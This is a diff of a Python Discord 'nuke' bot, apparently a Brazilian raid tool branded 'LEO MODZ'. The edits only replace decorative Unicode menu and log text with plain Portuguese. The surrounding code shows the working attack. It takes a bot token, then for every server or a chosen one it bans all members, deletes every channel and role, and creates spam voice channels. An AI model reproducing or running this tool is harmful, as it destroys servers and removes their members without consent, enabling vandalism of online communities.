@@ -21,7 +21,7 @@ baner = f'''
 {r}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
 {r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
 {r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
-{y}𝐁𝐎𝐓 𝐁𝐲: {g}𝐡𝐭𝐭𝐩𝐬://𝐭.𝐦𝐞/𝐋𝐄𝐎𝐌𝐎𝐃𝐙𝐎𝐅𝐂'''
+{y}NUKE BOT BY LEO MODZ TELEVRAM {g}𝐡𝐭𝐭𝐩𝐬://𝐭.𝐦𝐞/𝐋𝐄𝐎𝐌𝐎𝐃𝐙𝐎𝐅𝐂'''
 
 
 
@@ -77,15 +77,15 @@ async def create_voice_channels(guild, name):
     return created
 
 async def nuke_guild(guild):
-    print(f'{r}𝐍𝐔𝐊𝐄: {m}{guild.name}')
+    print(f'{r}NUKE: {m}{guild.name}')
     banned = await ban_all_members(guild)
-    print(f'{m}𝐁𝐀𝐍𝐈𝐃𝐎:{b}{banned}')
+    print(f'{m}BANIDIS:{b}{banned}')
     deleted_channels = await delete_all_channel(guild)
-    print(f'{m}𝐃𝐄𝐋𝐀𝐓𝐀𝐑 𝐂𝐀𝐍𝐀𝐋:{b}{deleted_channels}')
+    print(f'{m}DELETAR CANAL:{b}{deleted_channels}')
     delete_roles = await delete_all_roles(guild)
-    print(f'{m}𝐃𝐄𝐋𝐄𝐓𝐀𝐑 𝐑𝐎𝐋𝐄𝐒:{b}{delete_roles}')
+    print(f'{m}DELETAR ROLES:{b}{delete_roles}')
     created_channels = await create_voice_channels(guild,name)
-    print(f'{m}𝐂𝐑𝐈𝐖𝐑 𝐂𝐀𝐍𝐀𝐋 𝐃𝐄 𝐕𝐎𝐙:{b}{created_channels}')
+    print(f'{m}CRIAR CANAL DE VOZ:{b}{created_channels}')
     #created_roles = await created_roles(guild,name)
     #print(f'{m}Create Roles:{b}{created_roles}')
     print(f'{r}--------------------------------------------\n\n')
@@ -96,34 +96,34 @@ while True:
     choice = input(f'''   
 {baner}                
 {c}--------------------------------------------
-{b}[𝐌𝐄𝐍𝐔]
-    {y}└─[1] {m}- {g}𝐒𝐓𝐀𝐑 𝐋𝐄𝐎 𝐁𝐎𝐓 𝐈𝐍𝐕𝐀𝐒𝐎𝐄𝐒
-    {y}└─[2] {m}- {g}𝐒𝐀𝐈𝐑
+{b}[MENU]
+    {y}└─[1] {m}- {g}STAR BOT NUKE
+    {y}└─[2] {m}- {g}SAIR
 {y}====>{g}''')
     if choice == '1':
-        token = _input(f'{y}𝐃𝐈𝐆𝐈𝐓𝐄 𝐎 𝐓𝐎𝐊𝐄𝐍 𝐃𝐎 𝐁𝐎𝐓:{g}')
-        name = _input(f'{y}I𝐃𝐈𝐆𝐈𝐓𝐄 𝐎 𝐍𝐎𝐌𝐄 𝐃𝐈 𝐂𝐀𝐍𝐀𝐋:{g}')
+        token = _input(f'{y}DGITE O TOKEN DO BOG:{g}')
+        name = _input(f'{y}DIGITE O NOME DO CANAL PARA RADIAR:{g}')
         clear()
         choice_type = _input(f'''
 {baner}                
 {c}--------------------------------------------
 {b}[Select]
-    {y}└─[1] {m}- {g}𝐑𝐀𝐃𝐈𝐀𝐑 𝐓𝐎𝐃𝐎𝐒 𝐒𝐄𝐑𝐕𝐈𝐃𝐈𝐑𝐄𝐒
-    {y}└─[2] {m}- {g}𝐑𝐀𝐃𝐈𝐀𝐑 𝐀𝐏𝐄𝐍𝐀𝐒 𝐔𝐌 𝐒𝐄𝐄𝐕𝐈𝐎𝐑
-    {y}└─[3] {m}- {g}𝐒𝐀𝐈𝐑
+    {y}└─[1] {m}- {g}RADIAR TODOS SERVUDORES
+    {y}└─[2] {m}- {g}RADIAR APENAS UM SERVIDOR
+    {y}└─[3] {m}- {g}SAIR
 {y}====>{g}''')
         client = commands.Bot(command_prefix='.',intents=discord.Intents.all())
         if choice_type == '1':
             @client.event
             async def on_ready():
                 print(f'''
-[+]𝐋𝐎𝐆𝐀𝐃𝐎 𝐂𝐎𝐌𝐎 {client.user.name}
-[+]𝐁𝐎𝐓 𝐈𝐍 {len(client.guilds)} 𝐒𝐄𝐑𝐕𝐄𝐑𝐒!''')
+[+]LOGADO COMI {client.user.name}
+[+]BOT {len(client.guilds)} SERVERS!''')
                 for guild in client.guilds:
                     await nuke_guild(guild)
                 await client.close()
         elif choice_type == '2':
-            guild_id =  _input(f'{y}𝐃𝐈𝐆𝐈𝐓𝐄 𝐎 𝐋𝐈𝐍𝐊 𝐃𝐎 𝐒𝐄𝐑𝐕𝐄𝐑:{g}')
+            guild_id =  _input(f'{y}DIGITE O LINK DO SERVER:{g}')
             @client.event
             async def on_ready():
                 for guild in client.guilds:
@@ -131,17 +131,17 @@ while True:
                         await nuke_guild(guild)
                 await client.close()
         elif choice_type == '3':
-            print(f'{dr}𝐒𝐀𝐈𝐑...')
+            print(f'{dr}SAIR...')
             exit()
         try:
             client.run(token)
-            input('𝐑𝐀𝐃𝐈𝐀𝐃𝐎 𝐂𝐎𝐌 𝐒𝐔𝐂𝐄𝐒𝐒𝐎 𝐁𝐘 𝐋𝐃𝐎 𝐁𝐎𝐓 𝐈𝐍𝐕𝐀𝐃𝐎𝐄𝐒')
+            input('RADIADO COM COM SUCESSO BY LEO BOT INVASOES')
         except Exception as error:
             if error == '''Shard ID None is requesting privileged intents that have not been explicitly enabled in the developer portal. It is recommended to go to https://discord.com/developers/applications/ and explicitly enable the privileged intents within your application's page. If this is not possible, then consider disabling the privileged intents instead.''':
                 input(f'{r}Intents Error\n{g}For fix -> https://prnt.sc/wmrwut\n{b}Press enter for return...')
             else:
-                input(f'{r}{error}\n{b}𝐏𝐓𝐄𝐂𝐈𝐎𝐍𝐄 𝐄𝐍𝐓𝐄𝐑 𝐏𝐀𝐑𝐀 𝐕𝐎𝐋𝐓𝐀𝐑 𝐀𝐎 𝐍𝐄𝐍𝐔 𝐈𝐍𝐈𝐂𝐈𝐀𝐋')
+                input(f'{r}{error}\n{b} PRECIONE ENTER PARA VOLTAR AO MENU INICIAL')
             continue
     elif choice == '2':
-        print(f'{dr}𝐒𝐀𝐈𝐑...')
+        print(f'{dr}SAIR...')
         exit()
